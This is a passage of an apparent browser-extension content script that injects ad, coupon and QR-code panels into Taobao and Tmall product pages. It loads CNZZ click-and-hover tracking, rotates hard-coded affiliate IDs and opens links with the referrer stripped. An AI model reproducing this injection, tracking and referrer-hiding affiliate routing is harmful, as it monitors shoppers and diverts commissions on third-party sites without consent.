﻿//上面两个广告位模块1
// 中间优惠券模块2 > 判断是否有优惠券
// 下面轮播活动模块3
// 右下角弹窗模块4
setTimeout(function () {
    if ($("body").attr("mainSign2018625") == 1) {
        return;
    }
    $("body").attr("mainSign2018625","1");
    function cnzzAppend(callBack) {
        if (!$('html').html().match(`1273525106`)) {
            $("<script></script>").html(`var _czc = [];_czc.push(["_setAccount","1273525106"]);`).prependTo($("head"));
            $.getScript("https://s19.cnzz.com/z_stat.php?id=1273525106&web_id=1273525106",function () {
                $(document).on("click","[data-mgClick]",function () {
                    var name = $(this).attr("data-mgClick");
                    cnzzEvent(name,"点击");
                });
                var clock;
                $(document).on("mouseenter","[data-mgMove]",function () {
                    var that = $(this);
                    clock = setTimeout(function () {
                        var name = that.attr("data-mgMove");
                        cnzzEvent(name,"移入");
                    },500);
                });
                $(document).on("mouseleave","[data-mgMove]",function () {
                    clearInterval(clock);
                });
                callBack();
            });
        } else {
            callBack();
        }
    }                         //CNZZ统计
    function cnzzEvent(n,e) {
        $("<script></script>").html(`var _czc = [];_czc.push(["_setAccount","1273525106"]);`).prependTo($("head"));
        var myScript = document.createElement("script");
        myScript.appendChild(document.createTextNode(`_czc.push(["_trackEvent","${n}","${e}"]);`));
        document.head.appendChild(myScript);
    }                               //CNZZ统计
    if ($("body").attr("dypSign159357") != 1) {
        var hitTb = 0;
        var matchTbUrl = [
            'detail.tmall.com',
            'item.taobao.com'
        ];
        $.each(matchTbUrl,function (k,v) {
            if (v == location.host) {
                hitTb = 1;
                return false
            }
        });
        if (hitTb) {
            start();
        }
        if (location.host == "www.taobao.com") {
            startUseInfo();
        }
        startAllUrl();
    }
    function calcTime(cookieName,callBack) {
        if (document.cookie.indexOf(`${cookieName}=1`) == -1) {
            var curDate = new Date();
            var curTamp = curDate.getTime();
            var curWeeHours = new Date(curDate.toLocaleDateString()).getTime() - 1;
            var passedTamp = curTamp - curWeeHours;
            var leftTamp = 24 * 60 * 60 * 1000 - passedTamp;
            var leftTime = new Date();
            leftTime.setTime(leftTamp + curTamp);
            document.cookie = `${cookieName}=1;expires=` + leftTime;
            callBack();
        }
    }   //计算指定cookie剩余时间
    function start() {
        // var cssStyle='';
        var cssStyle = '#plugMid627,.plugMid627-tool{position:relative;background:#fff}#plugMid627{font-size:14px;font-family:"Microsoft YaHei",sans-serif;margin:5px 0;z-index:9;max-width:429px}#plugMid627.plugTM{margin-right:20px}.plugMid627-tool{display:flex;z-index:10}.plugMid627-tool>div{height:30px;display:flex;align-items:center;justify-content:center;border:1px solid #ECECEC;box-sizing:border-box;border-left:none}.plugMid627-drop{position:absolute;top:29px;display:none;padding-top:1px}.plugMid627-QQ,.plugMid627-set{width:40px}.plugMid627-flex{display:flex;align-items:center}.plugMid627-logo{width:30px;cursor:default;border-color:#F40137!important;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAMAAAC7IEhfAAAAolBMVEX0ATf////1KVf6ma/2N2L8wM34cpD94uj0D0L+9/j1JlT1Hk7++/v+6e395uv94Ob8usn1G0v+8/X94ef90Nr7pbj6j6f6iqP4aor+8fT92eH8zdj6nLH3WHz3THL2QWr0Fkj0BTr+7vH91t78yNT8w9D7ssL7rb77qrz5hJ75epf4cI/4ZIb4X4H3VHn2PGb92+L7tcT7tMT6oLT5d5T2RGyzIRGEAAABGklEQVQ4y+3R2XKCQBAF0L6IOiCrssgmwX036///WmBIIsJg8N3zcqGqa2bqNj09inkS3eMbNnFT+Dxtg2dDjB1xLo48d+iRiAw94x8G+NWZDpmEIiRFXGBSIUFETaozHI4xHubmUIoofx21NpiiRUo1tvQjhiVd2dRmpECmLrZY0z3nXukDsHpV9eMNtHDrbQ8KvobVgPM0IM7zMCIBycSCUeliQpmS2GyOxbUO5gLvL6LdvAF9RhVJAH3WPE6DZvWrLE9eAY3r99iqJm4F6l7zqC5/DpMNnORfqQWXGAl9Qa+WgJDE2CsO1bVj0jIXYZl1GBw5cBj9P3gMEN72e8KSmjbAhv2VP1FyvMSGdXiubElHzvykp46+AbUPD9nBTSJTAAAAAElFTkSuQmCC);background-size:cover}.plugMid627-AD{flex:auto;cursor:pointer}.plugMid627-ADTitle{color:#333;margin-left:10px;height:20px;overflow:hidden}.plugMid627-ADIcon{font-size:12px;color:#FF3A27;border:1px solid #FF3A27;border-radius:3px;padding:0 2px}.plugMid627-AD:hover .plugMid627-ADTitle{color:#F40137}.plugMid627-AD .plugMid627-drop{left:0}.plugMid627-ADImg{background:#fff}.plugMid627-AD .plugMid627-drop.qrCode{left:auto;right:80px;width:153px;border:1px solid #ECECEC;border-top:none}.plugMid627-AD .plugMid627-drop.qrCode>div{background:#FFF}.plugMid627-drop.qrCode .plugMid627-ADImg{width:130px;margin:0 auto;padding:15px 0}.plugMid627-drop.qrCode .plugMid627-drop-title{text-align:center;padding-bottom:15px}.plugMid627-ADImg img{width:100%;vertical-align:middle}.plugMid627-ADItem2{display:flex;width:100%;padding:10px 20px;border:1px solid #ECECEC;border-top:none;border-bottom:2px solid #FD2550;box-sizing:border-box}.plugMid627-ADItem2-img{width:60px;height:60px;margin-right:10px}.plugMid627-ADItem2-box{flex:1;position:relative}.plugMid627-ADItem2-icon{position:absolute;width:14px;height:14px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAABEVBMVEX/RQD/VQD/VAD/RQD/RQD/VQD/VQD////+RgD/RQD/QwD/SgD8////UwD/TQD/PQD/MwD/LAD/UQD/LgD90sH+49X92sn9y7P8n3z8eUb/QQH/PwD/OgD/OAD9/Pr9+fb+9vH+7ev+6N780bz9z7b9zLb8xrL+wqv+w6b7r5b8rYv+qYT9nXX9mXL+knH9lmn8j179iVb+hFL+gEv8fkX8ZTn9bin9ZCn+UBL+PgX/TQL+RwD/DAD+/fj+8uj91cT+0cT8yav8vaX9uJr+spH8ooz9m4f9lHn8onD7m2v7kGr8iWj9cFL+d079cjT8WDH9aC/9WS37ayr9WSH/Zx78Yxr+Wg3/Vwz7OgD8LAD/AQBbThY0AAAABnRSTlPn5ublSkmb2EzAAAAA3klEQVQY003BBW4DMRAAwA3dXmzHcIxhZuYyM+P/H1KpUqTMQCah7UlkIKlxovHQ0HL/kmBw/hF8zokpRSypZgCPXOYP2fDqpF4dEJIDI+6UbsrIKv2HHrNCCvxr+l0tuPgav6+aOI9ALFjTH9VqRbt1d44TCTSY5cdTp4v2/dMZjk1YG79tZ3ZhoV33OjhSsFbL/PVxn+DAO+3ixITo5bDwc4BHWHLLFj6aoNqst31uOJfebYsVVwKyxF8Sqcztwqo03iQFSpSgG51QEehK0g2k9J1QEF0HSEN2Tyr9BwwsHAF+24CqAAAAAElFTkSuQmCC);background-size:cover;top:3px}.plugMid627-ADItem2-title{font-size:13px;color:#4A90E2;line-height:20px;height:40px;display:-webkit-box;overflow:hidden;text-indent:18px;-webkit-line-clamp:2;-webkit-box-orient:vertical}.plugMid627-ADItem2-price{position:absolute;font-size:20px;color:#FD2550;line-height:20px;right:0;bottom:0}.plugMid627-QQ{cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAUCAYAAACAl21KAAAAAXNSR0IArs4c6QAAAg1JREFUOBGVlM1LG0EYxrO7SbNNIM1FEMWrtx6U9tI2wZAvzFFI69GLh4oHD22hUCj9+AtKUdCrCJpWFD+CIRdvgoJ3UbwqUhMJaUtKkv7e4CzJuiHrwPDOvM/zPvvM7MxoHoeWzWYflsvl1WazOQb84JbyT9O0ffqrQqFQtZfp9kQsFpsolUqXIhAIBEaLxaIpnfEIOb3RaFwkk8msvU5rT2Qymce1Wu3A5/NN5vP5rXZMjVOp1DhiP5i/4APHKt/hCJE9lvO+m4gUsaw84Q1d4t2G3al4PH56F3HOwD9Jp9PTCm13NEnypwJ6RZyv0V8qniVEcoC9sdasCN2iYRjH7NWAwi0hEkOVSmVHAb1iKBTahTPYwYtEIn2JROKqI+liQs1FNBodEmrLkd/vlz9QcFFrp+yZprkhSQ1V2bBvnIl+O8vNXFx5vd45cfSFjXvnpsiJw5V5W6/XP3s4D7+cCPfJoXEtjrz3KerCNUTEQHGTOIzNJ04326mYOxfk7B2BnYuG3OZlBiJ4Qm/9AWLPhsg6pDO6gYEVq4AvLPIHBHDV5F6ykiVFbp0jBD7iLM2b80wBvWIwGHyOK7SSn4Tb2mis/WVsVqvVYaI8ah5eyUe8kt8ZZijQ4WyHw+HZXC53I7hwyZlgf2RuPWy4+grwGiBwm68zP8TpjBB1XZ8HeypDmYP9Zr7AQf4g8/+C/7zh5Cz/zQAAAABJRU5ErkJggg==) center no-repeat}.plugMid627-QQ a{display:block;width:100%;height:100%}.plugMid627-QQ:hover{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAUCAMAAAC3SZ14AAAAclBMVEUAAAD0ATf1ATf1ATb1ATj1ATf/FDz0ATf2ATb1ATf2ATf1ATf1Ajj3Azj6BTn1Ajb2Azn0Azj/Czn1ATj1ATj1ATf2ATb1ATf0Ajf1Ajf3Ajb4Azr3BDv/B0D/HFX1ATf2Ajj1Ajf2Ajj1Ajf1Ajr/CT4MyKkgAAAAJnRSTlMA7uj4uLMM8fXz3NiaVCyEYVoW4dLNwLujd2tLPSQJ6qWhiYF/HYoZQm0AAACiSURBVBjTXY9ZEoMgEESHTUARFfc1+/2vGCQxTHwf3VWPYgYgsAnJmBYJ/MglXwFWrvPDWDVDYFb2q+h0HE7002UaR2RlKH6PquhDNRVa1IQiaPcm93QXQNCXj/aK1a31tyn8QauwFlOlQOAEAXlWErTI0COSjGswQvRRccGNL4P+mJo9n7WLytUPnyNd/IyBkMHPXOgYfk8YU521nWKMFABvCTIF2an2KvsAAAAASUVORK5CYII=) center no-repeat}.plugMid627-set{cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAUCAMAAAC+oj0CAAAAhFBMVEUAAABcXFxFRUVISEhERERFRUVERERERERERERERERERERFRUVFRUVERERERERGRkZGRkZKSkpOTk5FRUVFRUVERERFRUVHR0dMTExFRUVFRUVFRUVFRUVFRUVHR0dGRkZJSUlERERERERHR0dFRUVISEhFRUVERERERERERERHR0dEREQ3G3oLAAAAK3RSTlMAB3Ie8I345630plxIm4c3NBgL18vAYCQS+7qTgnwuKw7RuE9OJ97dtGVEEnIQpAAAANhJREFUGNN1kdeywyAMRBcMBlzjJI5berkl+///F8OEiV9yXtDsSGglIZBkbhJAbsYVPlSps7xIy9YwW0e1YNmguNBIrPeUUa55909I67iLcsIckRWLGEqeEBFpicDpkFpfov/0A8Ce2rvRZHYGauW2Ki0AoQdegd+xwcxm06DfGgGgLyngqtA1GLjziJmcCdKFfPvIP9flJz48TxRYtnRPQFQDRwDHt8HK6i4YnGrxdZzvw9e8+bzO1z64Wyy2h1RU82IPlIjoQbW0eRbPEOms8Un/qn0f7QVYDhEZoiy6NwAAAABJRU5ErkJggg==) center no-repeat}.plugMid627-set:hover{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAUCAMAAAC+oj0CAAAARVBMVEUAAAD1ATf1ATf4BTn2ATf1ATf2Ajj4BTn2Ajj2Ajj1ATf2Ajf1ATf2Ajj1ATf2Ajf1ATf1ATf1Ajj1Ajj2ATf2ATj1ATf16wIiAAAAF3RSTlMAxtsbiuImElZOlkeyCdBquqp9X3I764IS+eEAAAC/SURBVBjTdZFZssQgCEVldEKj6eTtf6mPdLU9fMQf4RTFhUu4Xjsnsoa4dastrBcZ+8DBhgBSaOGHl8ZkfWykjNvCSZI3IiVvkOWxcJUc3jGmFTKeb3z28vwpsTB5WbFSXX6XkjxlAFaXBZgA3kB3By2gpejJsKp5GHl9nhjD3+405H7NdfRLu21CdxgtO6dh+bvJnSSl8hpwfga8Wed2+WVVVNVl1cdYOkDg19hYBADnMX/PEFo1PGKgXcbraP8E0wjYgd4G6AAAAABJRU5ErkJggg==) center no-repeat}.plugMid627-set .plugMid627-drop{width:81px;right:0}.plugMid627-set ul{border:1px solid #ECECEC;border-top:none;background:#fff}.plugMid627-set li{height:40px;line-height:40px;text-align:center}.plugMid627-set li:hover{color:#F40137}.plugMid627-noCoupon img{width:100%;vertical-align:middle}.plugMid627-coupon{background:#fff}.plugMid627-hasCoupon{display:none;border-left:1px solid #ececec;border-right:1px solid #ececec;border-bottom:1px dashed #ececec;padding-left:20px;height:79px}.plugMid627-couBox{position:relative;display:flex;align-items:center;width:100%;height:100%}.plugMid627-couPrice{color:#444;font-size:14px;width:100px;overflow:hidden;white-space:nowrap}.plugMid627-couPrice span{font-weight:700;font-size:16px;color:#F40137}.plugMid627-couTime{font-size:12px;color:#999;width:100px;overflow:hidden}.plugMid627-couBack{width:155px;height:44px;cursor:pointer;color:#fff;margin-left:15px;background:url(data:image/png;base64,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)}@media (max-width:1179px){#plugMid627.plugTB .plugMid627-couBack{margin-left:-5px}#plugMid627.plugTB .plugMid627-hasCoupon{padding-left:10px}#plugMid627.plugTB .plugMid627-ADTitle{width:62px;overflow:hidden}}.plugMid627-couAmount,.plugMid627-couNeed{width:97px;text-align:center;line-height:16px;height:16px}.plugMid627-couAmount{margin-top:7px;font-size:16px;font-weight:700}.plugMid627-couNeed{font-size:12px;transform:scale(.84);margin-top:3px;overflow:hidden;opacity:.6}.plugMid627-couEmpty{width:60px}.plugMid627-couQr{position:absolute;width:48px;right:12px;top:11px;cursor:pointer}.plugMid627-couQr-icon{width:30px;height:30px;margin:4px auto 6px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAYFBMVEUAAABFRUVGRkZFRUVFRUVFRUVFRUVERERGRkZFRUVHR0dFRUVRUVFJSUlFRUVJSUlFRUVFRUVbW1tFRUVISEhERERERET///9ERERFRUVFRUVERERFRUVKSkpVVVVEREQGu0XdAAAAH3RSTlMAXUmnZOL5e0KuK8UTDZgVkVUIkyDZwAHQf3jrthgDjfjCdgAAALZJREFUKM+l0dkOwiAQheHTTZQWKktXF97/LW0E4sRIiul/RfhuYAaOVgC1I532ual8Y+QxXDRvruArI5/hu2RyIaWmLKRUhKVzgnLv3DWftRCgPAmhM582lr4l8hou2o2PDbWgWcAWNByroSlAheMCyGZIPI1M7db6hshz23pOTa3/i5Ux+otnY4b0Qn15LLpuojx1ocS+Yxvfua/+8JPzB2A5hyP9+NgOMxoHOGMWmrESUGx9AbSUL+2LYKH8AAAAAElFTkSuQmCC)}.plugMid627-couQr-title{font-size:12px;height:18px;line-height:18px}.plugMid627-couQr-box{display:none;position:absolute;z-index:100000;top:-12px;right:-170px;text-align:center;width:158px;height:202px;overflow:hidden}.plugMid627-couQr-drop{background:#fff;width:156px;height:200px;border:1px solid #ececec;transform:translate3d(-100%,0,0);transition:transform .5s}.plugMid627-couQr-drop.show{transform:translate3d(0,0,0)}#plugMid627-couQr{margin:18px auto 10px;width:120px}.plugMid627-noCoupon{display:none;cursor:pointer}.plugMid627-rollAd{height:30px;border:1px solid #ECECEC;border-top:none;overflow:hidden;position:relative;background:#fff;z-index:8}.plugMid627-rollAd ul{position:relative;height:100%;padding-left:20px}.plugMid627-rollAd li{height:30px;color:#444;display:flex;align-items:center}.plugMid627-rollAd span{line-height:30px;cursor:pointer}.plugMid627-rollAd span:hover{color:#F40137}#plugFix627{display:none;position:fixed;width:100%;height:100%;left:0;top:0;z-index:2147483647}.plugFix627-shadow{position:absolute;left:0;top:0;right:0;bottom:0;background:rgba(0,0,0,.75)}.plugFix627-box{text-align:center;border-radius:20px;width:500px;height:500px;box-sizing:border-box;position:absolute;left:50%;top:50%;margin:-250px 0 0 -250px}.plugFix627-close{position:absolute;right:50%;bottom:0;margin-right:-15px;width:30px;height:30px;cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAMAAAAp4XiDAAAAZlBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+Vn2moAAAAIXRSTlMAu/oRSx0M8XRZJ+2lBz3Dwm713aqek4h5ajLgxdG2gGKXqD5kAAABfUlEQVRIx52W6XaFIAyEw+JVBLu4Vr3bvP9LttLWIyVaD/NPD58yJCShWMr0orFS2kb0RtG/ykYhsZEUY3YMdH5VoUtVVarUhee7fUgNNWRrVLjLVqIeFE9oC7iM+bUDrOaID0BMxGoSwEf0tnJAQbsqAFf9Ia7INR1I57iGjMNc0qHKGS70kQcEy+RbPxrY3RW/StnYOX8G9jc+AwSdksDwE6oa0zlkQv0d6g6OTsqh8z+BzM4imcSydkRLp9Vi9J5M6PF+oVUv85O2MhBESsows+94u6xEHn7Pr/ZcoMvrF7MS79E5G+pREMfwBBXoSUATx/AEaQhqUBLLsASVaMhCEcfcWIIULElUxDC3nUtaQbKI97H44RELxRLF4ofdGGvfO/dnwNoX0CxBPKMhllCyxMrEoTQQPMEzAiZOy9kTK/OI0jJO/uf28fIoo+RPuGIJFzmhXCQUpYTSl1BgE8p4QrNIaEkJjS+hvaY18fRR4XggSRx70oerhBHuE36YJtNdpHYUAAAAAElFTkSuQmCC);background-size:cover}';
        // $.ajax({
        //     url:chrome.extension.getURL("local/style.css"),
        //     type:"get",
        //     async:false,
        //     dataType:"html",
        //     data:{},
        //     success:function (d) {
        //         cssStyle = d;
        //     },
        //     error:function () {
        //     }
        // });
        $("<style></style>").html(cssStyle).appendTo("head");
        var middleTemplateHtml1 = `<div id="plugMid627">
            <div class="plugMid627-tool">
                <div class="plugMid627-logo"></div>
                <div class="plugMid627-AD" id="plugMid627-ADImg1">
                    <div class="plugMid627-ADIcon"></div>
                    <div class="plugMid627-ADTitle"></div>
                    <div class="plugMid627-drop">
                        <div class="plugMid627-ADImg"></div>
                    </div>
                </div>
                <div class="plugMid627-AD" id="plugMid627-ADImg2">
                    <div class="plugMid627-ADIcon"></div>
                    <div class="plugMid627-ADTitle"></div>
                    <div class="plugMid627-drop qrCode">
                        <div>
                            <div class="plugMid627-ADImg"></div>
                            <div class="plugMid627-drop-title">微信扫码马上体验</div>
                        </div>
                    </div>
                </div>
                <div class="plugMid627-QQ"><a href="" target="_blank"></a></div>
                <div class="plugMid627-set">
                    <div class="plugMid627-drop">
                        <ul>
                            <li class="plugMid627-close">本次关闭</li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="plugMid627-coupon">
                <div class="plugMid627-hasCoupon"></div>
                <div class="plugMid627-noCoupon"></div>
            </div>
            <div class="plugMid627-rollAd">
                <ul></ul>
            </div>
        </div>`;
        var middleTemplateDom = {
            ".tm-fcs-panel":2,
            ".tb-promo-meta":2,
            ".tb-meta":2
        };  //天猫 淘宝 淘宝 京东 苏宁 国美 当当 聚划算
        $.each(middleTemplateDom,function (v) {
            if ($(v).length) {
                $(v).after(middleTemplateHtml1);
                if (v == ".tm-fcs-panel") {
                    $("#plugMid627").addClass('plugTM');
                } else {
                    $("#plugMid627").addClass('plugTB');
                }
                return false;
            }
        }); //中间区域插入代码块
        var sj_id = getUrlParam("id"),//获取当前商品id
            consult = [
                "//shang.qq.com/wpa/qunwpa?idkey=03fadcbef6b546b8024c1038f5a5f9908aad1f44cadef00cd5099812136bae9d",
                "//shang.qq.com/wpa/qunwpa?idkey=03fadcbef6b546b8024c1038f5a5f9908aad1f44cadef00cd5099812136bae9d",
                "//shang.qq.com/wpa/qunwpa?idkey=03fadcbef6b546b8024c1038f5a5f9908aad1f44cadef00cd5099812136bae9d",
                "//shang.qq.com/wpa/qunwpa?idkey=03fadcbef6b546b8024c1038f5a5f9908aad1f44cadef00cd5099812136bae9d",
                "//shang.qq.com/wpa/qunwpa?idkey=7dd26f8d1e24b774dcc810bca77b0858847a330fc97ca713749df584ac8d3a63",
                "//shang.qq.com/wpa/qunwpa?idkey=7dd26f8d1e24b774dcc810bca77b0858847a330fc97ca713749df584ac8d3a63",
                "//shang.qq.com/wpa/qunwpa?idkey=f39f47defe3af4c5f8d51097757a4a8a2117cde3122d24d209edd1247a50b7fd",
                "//shang.qq.com/wpa/qunwpa?idkey=7fd3b630aefe61709b871b882eeaa589e27e7602981384d1d90abf5e2bca2eab",
                "//shang.qq.com/wpa/qunwpa?idkey=2a33f551c1c50c803ab643f76a7bdb109f4f7f781ed407ec87ba5479247e4816",
                "//shang.qq.com/wpa/qunwpa?idkey=7a7d503e5a1a5cac589fa293034513c7d6f09da5873072b2161bb3096246ade9",
                "//shang.qq.com/wpa/qunwpa?idkey=7b0d150758f197630ae19f9ee6e7f7463c24caae7ae1ca7bdf8f17513792ce1a"
            ],//咨询群
            myMmId = [
                "mm_112599953_15986703_1830622155",
                "mm_112599953_15986703_1830642134",
                "mm_112599953_15986703_1830626647",
                "mm_112599953_15986703_1830646659",
                "mm_112599953_15986703_1830646823",
                "mm_112599953_15986703_1830648942",
                "mm_112599953_15986703_1830704068",
                "mm_112599953_15986703_1830704258",
                "mm_131487042_42936790_469416271",
                "mm_131487042_42936790_469418146",
                "mm_131473982_42930969_469390839",
                "mm_131473982_42930969_469408615",
                "mm_63658289_42938845_500780731",
                "mm_63658289_42938845_500792726",
                "mm_130652011_42936815_500820201",
                "mm_130652011_42936815_500810666",
                "mm_112599953_15986703_11379650165"
            ],//推广mmid
            myQrMmId = [
                "mm_131487042_42936790_469416271",
                "mm_131487042_42936790_469418146",
                "mm_131473982_42930969_469390839",
                "mm_131473982_42930969_469408615",
                "mm_63658289_42938845_500780731",
                "mm_63658289_42938845_500792726",
                "mm_130652011_42936815_500820201",
                "mm_130652011_42936815_500810666"
            ],//扫码推广mmid
            myPostMmId = "mm_133078964_46586405_1416646851",//上报mmid
            sj_title = $("head>title")[0].innerHTML.replace(/-淘宝网|-tmall.com天猫$/,""),//详情页标题
            tblmUrl = "https://pub.alimama.com/items/search.json";//淘宝联盟搜索接口
        myMmId = myMmId[Math.floor(Math.random() * myMmId.length)];//获取随机id
        myQrMmId = myQrMmId[Math.floor(Math.random() * myQrMmId.length)];//获取扫码随机id
        function sub(a,b) {
            var c,d,e;
            try {
                c = a.toString().split(".")[1].length;
            } catch (f) {
                c = 0;
            }
            try {
                d = b.toString().split(".")[1].length;
            } catch (f) {
                d = 0;
            }
            return e = Math.pow(10,Math.max(c,d)), (mul(a,e) - mul(b,e)) / e;
        }                                     //消除浮点数减法
        function mul(a,b) {
            var c = 0,
                d = a.toString(),
                e = b.toString();
            try {
                c += d.split(".")[1].length;
            } catch (f) {}
            try {
                c += e.split(".")[1].length;
            } catch (f) {}
            return Number(d.replace(".","")) * Number(e.replace(".","")) / Math.pow(10,c);
        }                                     //消除浮点数减法
        function openWindow(full_link) {
            window.open('javascript:window.name;','<script>location.replace("' + full_link + '")<\/script>');
        }                        //不带refer跳转
        function getUrlParam(name) {
            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
            var r = window.location.search.substr(1).match(reg);
            if (r != null) return decodeURI(r[2]);
            return null;
        }                            //当前地址取参
        function getParam(url,name) {
            url = url.split("?")[1];
            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
            var r = url.substr(0).match(reg);
            if (r != null) return r[2];
            return null;
        }                           //指定url提参方法
        function opTimer(eve) {
            var timeArea = $(eve);
            var endTime = $(eve).data("endtime");
            if (endTime) {
                dateCountDown();
                setInterval(dateCountDown,1000);
                function dateCountDown() {
                    var now = Math.floor(new Date().getTime() / 1000);
                    if (now > endTime) {
                        timeArea.html("优惠券已失效");
                    } else {
                        var gap = endTime - now;
                        var dd = Math.floor(gap / (60 * 60 * 24));
                        var hh = Math.floor((gap - dd * 60 * 60 * 24) / (60 * 60));
                        // var mm = Math.floor((gap - dd * 60 * 60 * 24 - hh * 60 * 60) / 60);
                        // var ss = gap - dd * 60 * 60 * 24 - hh * 60 * 60 - mm * 60;
                        var timeStr = '还剩 '
                            + (dd > 0 ? '<em>' + dd + '</em>天' : '')
                            + (hh > 0 ? '<em>' + hh + '</em>时' : '');
